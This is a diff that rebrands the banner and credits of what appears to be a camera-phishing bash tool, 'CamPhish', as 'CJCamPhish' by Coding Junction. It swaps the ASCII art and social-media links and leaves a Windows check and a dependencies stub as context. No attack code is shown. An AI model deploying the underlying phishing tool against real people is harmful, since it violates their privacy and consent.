@@ -1,6 +1,6 @@
 #!/bin/bash
-# CamPhish v2.0
-# Powered by TechChip
+# CJCamPhish v2.0
+# Powered by Coding Junction
 
 # Windows compatibility check
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
@@ -30,20 +30,28 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
-printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
-printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
-printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
-printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
-printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
-printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
-printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
+printf "\e[1;96m"
+cat << "EOF"
+
+   ██████╗     ██╗ ██████╗ █████╗ ███╗   ███╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
+  ██╔════╝     ██║██╔════╝██╔══██╗████╗ ████║██╔══██╗██║  ██║██║██╔════╝██║  ██║
+  ██║          ██║██║     ███████║██╔████╔██║██████╔╝███████║██║███████╗███████║
+  ██║     ██   ██║██║     ██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
+  ╚██████╗╚█████╔╝╚██████╗██║  ██║██║ ╚═╝ ██║██║     ██║  ██║██║███████║██║  ██║
+   ╚═════╝ ╚════╝  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
+
+EOF
+printf "\e[0m"
 
 printf "\n"
+printf "\e[1;93m               CJCamPhish v2.0\e[0m\n"
+printf "\e[1;92m        Created & Maintained by Coding Junction\e[0m\n\n"
 
+printf "\e[1;96mGitHub    : \e[1;97mhttps://github.com/codingjunctioncybersec\e[0m\n"
+printf "\e[1;91mYouTube   : \e[1;97mhttps://youtube.com/@CodingJunctionOfficial\e[0m\n"
+printf "\e[1;95mInstagram : \e[1;97mhttps://instagram.com/codingjunction.official\e[0m\n"
 
+printf "\n"
 }
 
 dependencies() {
